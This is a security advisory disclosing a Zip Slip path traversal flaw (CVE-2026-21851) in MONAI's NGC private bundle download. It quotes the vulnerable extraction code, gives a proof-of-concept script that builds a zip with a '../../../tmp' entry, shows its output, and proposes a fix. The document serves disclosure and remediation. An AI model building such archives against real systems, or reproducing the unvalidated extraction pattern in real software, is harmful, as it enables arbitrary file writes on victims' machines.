# [M] MONAI has Path Traversal (Zip Slip) in NGC Private Bundle Download

## Summary
Severity: Medium
Advisory: GHSA-9rg3-9pvr-6p27
CVE: CVE-2026-21851
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-01-06
Source: https://github.com/advisories/GHSA-9rg3-9pvr-6p27
Type: github-advisory

## Affected
- PyPI: `monai` — affected >=0 <1.5.2

## Details
## Summary

A **Path Traversal (Zip Slip)** vulnerability exists in MONAI's `_download_from_ngc_private()` function. The function uses `zipfile.ZipFile.extractall()` without path validation, while other similar download functions in the same codebase properly use the existing `safe_extract_member()` function.

This appears to be an implementation oversight, as safe extraction is already implemented and used elsewhere in MONAI.

**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

---

## Details

### Vulnerable Code Location

**File:** `monai/bundle/scripts.py`  
**Lines:** 291-292  
**Function:** `_download_from_ngc_private()`

```python
# monai/bundle/scripts.py - Lines 284-293
zip_path = download_path / f"{filename}_v{version}.zip"
with open(zip_path, "wb") as f:
    f.write(response.content)
logger.info(f"Downloading: {zip_path}.")
if remove_prefix:
    filename = _remove_ngc_prefix(filename, prefix=remove_prefix)
extract_path = download_path / f"{filename}"
with zipfile.ZipFile(zip_path, "r") as z:
    z.extractall(extract_path)  # <-- No path validation
    logger.info(f"Writing into directory: {extract_path}.")
```

### Root Cause

The code calls `z.extractall(extract_path)` directly without validating that archive member paths stay within the extraction directory.

### Safe Code Already Exists

MONAI already has a safe extraction function in `monai/apps/utils.py` (lines 125-154) that properly validates paths:

```python
def safe_extract_member(member, extract_to):
    """Securely verify compressed package member paths to prevent path traversal attacks"""
    # ... path validation logic ...
    
    if os.path.isabs(member_path) or ".." in member_path.split(os.sep):
        raise ValueError(f"Unsafe path detected in archive: {member_path}")
    
    # Ensure path stays within extraction root
    if os.path.commonpath([extract_root, target_real]) != extract_root:
        raise ValueError(f"Unsafe path: path traversal {member_path}")
```

### Comparison with Other Download Functions

| Function | File | Uses Safe Extraction? |
|----------|------|----------------------|
| `_download_from_github()` | scripts.py:198 | ✅ Yes (via `extractall()` wrapper) |
| `_download_from_monaihosting()` | scripts.py:205 | ✅ Yes (via `extractall()` wrapper) |
| `_download_from_bundle_info()` | scripts.py:215 | ✅ Yes (via `extractall()` wrapper) |
| `_download_from_ngc_private()` | scripts.py:292 | ❌ No (direct `z.extractall()`) |

---

## PoC

### Step 1: Create a Malicious Zip File

```python
#!/usr/bin/env python3
"""Create malicious zip with path traversal entries"""
import zipfile
import io

def create_malicious_zip(output_path="malicious_bundle.zip"):
    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Normal bundle file
        zf.writestr(
            "monai_test_bundle/configs/metadata.json",
            '{"name": "test_bundle", "version": "1.0.0"}'
        )
        
        # Path traversal entry
        zf.writestr(
            "../../../tmp/escaped_file.txt",
            "This file was written outside the extraction directory.\n"
        )
    
    with open(output_path, 'wb') as f:
        f.write(zip_buffer.getvalue())
    
    print(f"Created: {output_path}")
    with zipfile.ZipFile(output_path, 'r') as zf:
        print("Contents:")
        for name in zf.namelist():
            print(f"  - {name}")

if __name__ == "__main__":
    create_malicious_zip()
```

**Output:**
```
Created: malicious_bundle.zip
Contents:
  - monai_test_bundle/configs/metadata.json
  - ../../../tmp/escaped_file.txt
```

### Step 2: Demonstrate the Difference

This script shows the difference between the vulnerable pattern (used in `_download_from_ngc_private`) and the safe pattern (used elsewhere in MONAI):

```python
#!/usr/bin/env python3
"""Compare vulnerable vs safe extraction"""
import zipfile
import tempfile
import os

def vulnerable_extraction(zip_path, extract_path):
    """Pattern used in monai/bundle/scripts.py:291-292"""
    os.makedirs(extract_path, exist_ok=True)
    with zipfile.ZipFile(zip_path, "r") as z:
        z.extractall(extract_path)
    print("[VULNERABLE] Extraction completed without validation")

def safe_extraction(zip_path, extract_path):
    """Pattern used in monai/apps/utils.py"""
    os.makedirs(extract_path, exist_ok=True)
    with zipfile.ZipFile(zip_path, "r") as zf:
        for member in zf.infolist():
            member_path = os.path.normpath(member.filename)
            
            # Check for path traversal
            if os.path.isabs(member_path) or ".." in member_path.split(os.sep):
                print(f"[SAFE] BLOCKED: {member.filename}")
                continue
            
            print(f"[SAFE] Allowed: {member.filename}")

# Run demo
print("=" * 50)
print("VULNERABLE PATTERN (scripts.py:291-292)")
print("=" * 50)
with tempfile.TemporaryDirectory() as tmpdir:
    vulnerable_extraction("malicious_bundle.zip", tmpdir)
    for root, dirs, files in os.walk(tmpdir):
        for f in files:
            rel_path = os.path.relpath(os.path.join(root, f), tmpdir)
            print(f"  Extracted: {rel_path}")

print()
print("=" * 50)
print("SAFE PATTERN (apps/utils.py)")
print("=" * 50)
with tempfile.TemporaryDirectory() as tmpdir:
    safe_extraction("malicious_bundle.zip", tmpdir)
```

**Output:**
```
==================================================
VULNERABLE PATTERN (scripts.py:291-292)
==================================================
[VULNERABLE] Extraction completed without validation
  Extracted: monai_test_bundle/configs/metadata.json
  Extracted: tmp/escaped_file.txt

==================================================
SAFE PATTERN (apps/utils.py)
==================================================
[SAFE] Allowed: monai_test_bundle/configs/metadata.json
[SAFE] BLOCKED: ../../../tmp/escaped_file.txt
```

---

## Impact

### Conditions Required for Exploitation

1. Attacker must control or compromise an NGC private repository
2. Victim must configure MONAI to download from that repository
3. Victim must use `source="ngc_private"` parameter

### Potential Impact

If exploited, an attacker could write files outside the intended extraction directory. The actual impact depends on:
- The permissions of the user running MONAI
- The target location of the escaped files
- Python version (newer versions have some built-in path normalization)

### Mitigating Factors

- Requires attacker to control an NGC private repository
- Modern Python versions (3.12+) have some built-in path normalization
- The `ngc_private` source is less commonly used than other sources

---

## Recommended Fix

Replace the direct `extractall()` call with MONAI's existing safe extraction:

```diff
# monai/bundle/scripts.py

+ from monai.apps.utils import _extract_zip

def _download_from_ngc_private(...):
    # ... existing code ...
    
    extract_path = download_path / f"{filename}"
-   with zipfile.ZipFile(zip_path, "r") as z:
-       z.extractall(extract_path)
-       logger.info(f"Writing into directory: {extract_path}.")
+   _extract_zip(zip_path, extract_path)
+   logger.info(f"Writing into directory: {extract_path}.")
```

This aligns `_download_from_ngc_private()` with the other download functions and ensures consistent security across all download sources.

---

## Resources

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Snyk: Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [Python zipfile.extractall() Warning](https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.extractall)

## References
- https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-9rg3-9pvr-6p27
- https://nvd.nist.gov/vuln/detail/CVE-2026-21851
- https://github.com/Project-MONAI/MONAI/commit/4014c8475626f20f158921ae0cf98ed259ae4d59
- https://github.com/Project-MONAI/MONAI
